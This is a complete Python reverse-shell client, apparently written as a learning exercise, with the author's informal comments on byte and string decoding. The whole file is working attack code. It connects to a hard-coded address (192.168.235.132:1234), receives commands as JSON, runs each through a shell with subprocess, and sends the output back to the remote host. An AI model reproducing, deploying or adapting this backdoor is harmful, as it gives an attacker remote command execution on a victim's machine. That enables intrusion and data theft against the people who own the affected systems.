#!/usr/bin/python3

import socket
import subprocess as sp
import json


def reliable_send(data):
	json_data = json.dumps(data.decode('utf-8')) # decode from bytes to work with JSON
	s.send(json_data.encode('utf-8')) # encoding data to send 


def reliable_recv():
	data = ""
	while True:
		try:
			data = data + s.recv(1024).decode('utf-8') # decode to concatenate string
			return json.loads(data)
		except ValueError:
			continue


def shell():
	while True:
		# command = reliable_recv().decode('utf-8') # ?need decode ???
		command = reliable_recv() # answer line 25: nope because data is already decoded in the reliable_recv function
		
		# Use b'q' because the command variable is a byte type after receiving from the server' --> Just use decode :))
		if command == 'q':
			break
		else:
			proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
			result = proc.stdout.read() + proc.stderr.read() # Apparently the data return from proc or maybe function read() from subprocess is already returned as bytes :))

			reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.235.132", 1234))

shell()

s.close()
